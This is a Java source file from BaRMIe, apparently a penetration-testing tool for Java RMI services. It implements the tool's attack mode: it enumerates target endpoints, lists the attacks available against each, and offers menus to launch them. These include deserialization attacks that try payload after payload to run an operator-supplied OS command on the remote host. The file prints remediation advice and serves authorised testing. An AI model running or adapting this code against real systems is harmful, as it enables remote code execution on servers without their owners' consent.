package nb.barmie.modes.attack;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.enumeration.RMIEnumerator;
import nb.barmie.net.TCPEndpoint;
import nb.barmie.util.ProgramOptions;

/***********************************************************
 * Attack mode - enumerates each given target and provides
 * a menu system for attacking those that can be attacked.
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class AttackMode {
	/*******************
	 * Properties
	 ******************/
	private final ProgramOptions _opts;
	private final BufferedReader _in;
	
	/*******************
	 * Construct the attack mode object.
	 * 
	 * @param options The program options.
	 ******************/
	public AttackMode(ProgramOptions options) {
		this._opts = options;
		this._in = new BufferedReader(new InputStreamReader(System.in));
	}
	
	/*******************
	 * Attack mode main function.
	 ******************/
	public void run() {
		RMIEnumerator rmie;
		ArrayList<RMITargetData> targets;
		ArrayList<RMITargetData> vulnTargets;
		RMITargetData td;
		
		//Initialise the list of known attacks with the current program options
		RMIAttackFactory.setProgramOptions(this._opts);
		
		//Get the list of targets and enumerate them
		targets = new ArrayList<RMITargetData>();
		vulnTargets = new ArrayList<RMITargetData>();
		rmie = new RMIEnumerator(this._opts);
		System.out.println("Enumerating " + this._opts.getTargets().size() + " target(s)...");
		for(TCPEndpoint t: this._opts.getTargets()) {
			//Enumerate the endpoint
			td = new RMITargetData(rmie.enumerateEndpoint(t));
			
			//Add it to the list of all targets
			targets.add(td);
			
			//Add it to the list of vulnerable targets if there are attacks available for the endpoint
			if(td.hasSupportedAttacks()) {
				vulnTargets.add(td);
			}
		}
		RMIAttackFactory.cleanUp();
		System.out.println("");
		
		//Print enumeration summary
		System.out.println("Target summary:");
		for(RMITargetData target: targets) {
			//Print the target host and port
			System.out.println("  " + target.getEndpoint().getEndpoint());
			
			//Check if any attacks were identified
			if(target.hasSupportedAttacks()) {
				//Print available attacks
				System.out.println("    Available attacks:");
				for(RMIAttack a: target.getAttacks()) {
					System.out.println("      " + a.getReliabilityIndicator() + " " + a.getDescription());
				}
				
				//If there are any deserialization attacks for the endpoint, print available deserialization payloads
				if(target.hasDeserializationAttacks()) {
					if(target.hasAffectedLibs()) {
						System.out.println("    Available deserialization payloads:");
						for(DeserPayload p: target.getDeserPayloads()) {
							System.out.println("      [+] " + p.getDescription());
						}
					}
				}
			} else {
				System.out.println("    No available attacks for this endpoint.");
			}
		}
		System.out.println("");
		
		//Enter the target selection menu if any of the targets can be attacked
		if(vulnTargets.size() > 0) {
			//Enter the target selection menu
			this.targetMenu(vulnTargets);
		} else {
			//No attacks available for the given endpoints
			System.out.println("No vulnerable targets identified.");
		}
	}
	
	/*******************
	 * Display a target selection menu.
	 * 
	 * @param targets The list of enumerated vulnerable targets, attacks, and deserialization payloads to choose from.
	 ******************/
	private void targetMenu(ArrayList<RMITargetData> targets) {
		String input = "";
		RMITargetData target;
		int i;
		
		//Loop until quit
		while(input.equalsIgnoreCase("q") == false) {
			//Print vulnerable targets
			System.out.println("Target selection");
			for(i = 0; i < targets.size(); ++i) {
				//Print target details
				target = targets.get(i);
				System.out.println(" " + (i + 1) + ") " + target.getDetailString());
			}
			
			//Get and handle the user's menu choice
			System.out.print("Select a target to attack (q to quit): ");
			input = "";
			try { input = this._in.readLine(); } catch(IOException ioe) { System.out.println("[-] An IOException occurred whilst attempting to read user input."); continue; }
			try {
				//Attempt to parse the input as a number, then if it's in the expected range descend into the attack menu
				i = Integer.parseInt(input);
				if(i > 0 && i <= targets.size()) {
					//Descend into the attack menu for the given target
					System.out.println("");
					input = this.attackMenu(targets.get(i - 1));
					if(input.equalsIgnoreCase("b")) {
						System.out.println("");
						input = "";
					}
				} else {
					//Invalid target choice
					System.out.println("[-] Invalid target number.");
				}
			} catch(NumberFormatException nfe) {
				//Not a number, if the input also wasn't "q" then it was invalid
				if(input.equalsIgnoreCase("q") == false) {
					System.out.println("[-] Invalid menu selection.");
				}
			}
		}
	}
	
	/*******************
	 * Display an attack selection menu for the given target.
	 * 
	 * @param target Details of the target that was selected for attack.
	 * @return The last menu option that was selected ([b]ack or [q]uit).
	 ******************/
	private String attackMenu(RMITargetData target) {
		String input = "";
		RMIAttack attack;
		int i;
		
		//Loop until quit or back
		while(input.equalsIgnoreCase("q") == false && input.equalsIgnoreCase("b") == false) {
			//Print available attacks
			System.out.println("Available attacks for target: " + target.getEndpoint().getEndpoint());
			for(i = 0; i < target.getAttacks().size(); ++i) {
				//Print attack details
				attack = target.getAttacks().get(i);
				System.out.println(" " + (i + 1) + ") " + attack.getReliabilityIndicator() + " " + attack.getDescription());
			}
			
			//Get and handle the user's menu choice
			System.out.print("Select an attack to execute (b to back up, q to quit): ");
			input = "";
			try { input = this._in.readLine(); } catch(IOException ioe) { System.out.println("[-] An IOException occurred whilst attempting to read user input."); continue; }
			try {
				//Attempt to parse the input as a number
				i = Integer.parseInt(input);
				if(i > 0 && i <= target.getAttacks().size()) {
					//Launch the attack, unless it's a deserialization attack, in which case descend into the deserialization payload menu
					System.out.println("");
					attack = target.getAttacks().get(i - 1);
					if(attack.isDeserAttack() == false) {
						try {
							System.out.println(attack.getDetailedDescription() + "\n");
							attack.executeAttack(target.getEndpoint());
						} catch(BaRMIeException bex) {
							System.out.println("[-] An exception occurred whilst attacking the target.");
							System.out.println("    " + bex);
						} finally {
							//Clean up after the attack
							attack.cleanUp();
							
							//Remediation advice
							System.out.println("\nRemediation advice (if attack was successful):");
							System.out.println("  " + attack.getRemediationAdvice() + "\n");
						}
					} else {
						input = this.deserPayloadMenu(target, attack);
						if(input.equalsIgnoreCase("b")) {
							System.out.println("");
							input = "";
						}
					}
				} else {
					//Invalid attack choice
					System.out.println("[-] Invalid attack number.");
				}
			} catch(NumberFormatException nfe) {
				//Not a number, if the input also wasn't "q" or "b" then it was invalid
				if(input.equalsIgnoreCase("q") == false && input.equalsIgnoreCase("b") == false) {
					System.out.println("[-] Invalid menu selection.");
				}
			}
		}
		
		//Return the last menu option
		return input;
	}
	
	/*******************
	 * Display a deserialization payload selection menu for the given target
	 * and attack.
	 * 
	 * @param target Details of the target that was selected for attack.
	 * @param attack The deserialization attack to execute.
	 * @return The last menu option that was selected ([b]ack or [q]uit).
	 ******************/
	private String deserPayloadMenu(RMITargetData target, RMIAttack attack) {
		String input = "";
		ArrayList<DeserPayload> supportedPayloads;
		ArrayList<DeserPayload> allPayloads;
		DeserPayload payload;
		int i;
		
		//Build the list of all payloads, starting with those that appear to be supported by leaked CLASSPATH data
		supportedPayloads = target.getDeserPayloads();
		allPayloads = new ArrayList<DeserPayload>();
		for(DeserPayload p: supportedPayloads) {
			allPayloads.add(p);
		}
		for(DeserPayload p: DeserPayloadFactory.getAllPayloads()) {
			if(supportedPayloads.contains(p) == false) {
				allPayloads.add(p);
			}
		}
		
		//Loop until quit or back
		while(input.equalsIgnoreCase("q") == false && input.equalsIgnoreCase("b") == false) {
			//Display the attack description
			System.out.println("Attack: " + attack.getDescription() + " " + attack.getReliabilityIndicator() + "\n");
			System.out.println(attack.getDetailedDescription() + "\n");
			
			//Display the deserialization payload menu
			System.out.println("Deserialization payloads for: " + target.getEndpoint().getEndpoint());
			for(i = 0; i < allPayloads.size(); ++i) {
				//Print payload details
				payload = allPayloads.get(i);
				if(supportedPayloads.contains(payload)) {
					System.out.println(" " + (i + 1) + ") * " + payload.getDescription());
				} else {
					System.out.println(" " + (i + 1) + ") " + payload.getDescription());
				}
			}
			System.out.println(" a) Try all available deserialization payloads");
			
			//Get and handle the user's menu choice
			System.out.print("Select a payload to use (b to back up, q to quit): ");
			input = "";
			try { input = this._in.readLine(); } catch(IOException ioe) { System.out.println("[-] An IOException occurred whilst attempting to read user input."); continue; }
			try {
				//Attempt to parse the input as a number
				i = Integer.parseInt(input);
				if(i > 0 && i <= allPayloads.size()) {
					//Launch the attack with the chosen payload
					try {
						System.out.println("");
						((RMIDeserAttack)attack).executeAttack(target.getEndpoint(), allPayloads.get(i - 1));
					} catch(BaRMIeException bex) {
						System.out.println("[-] An exception occurred whilst attacking the target.");
						System.out.println("    " + bex);
					} finally {
						//Clean up after the attack
						attack.cleanUp();
						
						//Remediation advice
						System.out.println("\nRemediation advice (if attack was successful):");
						System.out.println("  " + attack.getRemediationAdvice());
						System.out.println("  " + allPayloads.get(i - 1).getRemediationAdvice() + "\n");
					}
				} else {
					//Invalid payload choice
					System.out.println("[-] Invalid payload number.");
				}
			} catch(NumberFormatException nfe) {
				//Not a number, if the input was "a" then attempt the attack with all known payloads
				if(input.equalsIgnoreCase("a")) {
					System.out.println("");
					this.attemptAllDeserPayloads(target, attack, allPayloads);
				} else {
					if(input.equalsIgnoreCase("b") == false && input.equalsIgnoreCase("q") == false) {
						//Invalid input
						System.out.println("[-] Invalid menu selection.");
					}
				}
			}
		}
		
		//Return the last menu option
		return input;
	}
	
	/*******************
	 * Attempt a deserialization attack against the target using a list of
	 * payloads that are delivered one at a time.
	 * 
	 * Often a target won't reveal available libraries over RMI so it may not
	 * be possible to externally identify whether the require library for a
	 * deserialization payload is present. This method loops through multiple
	 * payloads to aid in exploiting these scenarios.
	 * 
	 * @param target Details of the target that was selected for attack.
	 * @param attack The deserialization attack to execute.
	 * @param payloads The list of payloads to attempt the attack with.
	 ******************/
	private void attemptAllDeserPayloads(RMITargetData target, RMIAttack attack, ArrayList<DeserPayload> payloads) {
		String input = "";
		String cmd = "";
		int ctr = 0;
		
		//Ask the user for a command to execute
		System.out.print("Enter an OS command to execute: ");
		try { cmd = this._in.readLine(); } catch(IOException e) {}
		
		//Attempt each payload one at a time
		System.out.println("\nTrying all deserialization payloads.");
		for(DeserPayload p: payloads) {
			//Attempt this attack/payload combination
			System.out.println("[~] Trying: " + p.getName());
			try {
				((RMIDeserAttack)attack).executeAttack(target.getEndpoint(), p, cmd);
			} catch(BaRMIeException bex) {
				System.out.println("[-] An exception occurred whilst attacking the target.");
				System.out.println("    " + bex);
			} finally {
				//Clean up after the attack
				attack.cleanUp();
				
				//Remediation advice
				System.out.println("\nRemediation advice (if attack was successful):");
				System.out.println("  " + attack.getRemediationAdvice());
				System.out.println("  " + p.getRemediationAdvice() + "\n");
			}
			
			//Check whether we should continue launching payloads
			if(input.equalsIgnoreCase("a") == false && ++ctr < payloads.size()) {
				//Loop until a valid choice is entered
				input = " ";
				while(input.equals("") == false && input.equalsIgnoreCase("y") == false && input.equalsIgnoreCase("n") == false && input.equalsIgnoreCase("a") == false) {
					System.out.print("[+] Payload delivered, continue trying payloads? [Y]es, [N]o, [A]ll (Y): ");
					try { input = this._in.readLine(); } catch(IOException ioe) { System.out.println("[-] An IOException occurred whilst attempting to read user input."); }
				}
				
				//If no was selected then return
				if(input.equalsIgnoreCase("n")) {
					return;
				}
			}
			System.out.println("");
		}
	}
}
